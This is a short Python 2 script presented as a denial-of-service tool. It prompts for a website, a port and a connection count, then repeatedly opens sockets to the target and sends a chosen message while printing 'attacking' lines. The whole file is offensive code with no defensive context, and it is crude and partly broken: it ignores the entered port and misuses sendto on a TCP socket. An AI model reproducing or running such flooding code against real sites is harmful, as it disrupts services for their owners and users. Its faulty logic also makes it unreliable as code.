import os
import socket
import sys
import time
import string
import httplib

host = raw_input("enter the website to dos: ")

try:
	print "checking host: " + host + " ..."
	conn = httplib.HTTPConnection(host)
	conn.connect()
	print "server is online"

except(httplib.HTTPResponse, socket.error) as Exit:
	raw_input("[!] server offline or invalid url")
	exit()

message = raw_input(str("any message to send: "))
port = input("port you want to attack: ")
conn = input("how many connections you want to make: ")

ip = socket.gethostbyname(host)

def attack():
	dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		dos.connect((host, 80))
		dos.send(message)
		dos.sendto(message, (ip, port))
		dos.send(message)

	except socket.error, msg:
		print "[!] failed ... error"

	print time.ctime(time.time()) + " : attacking >> " + host + " " + ip
	dos.close()

for i in xrange(conn):
	attack()
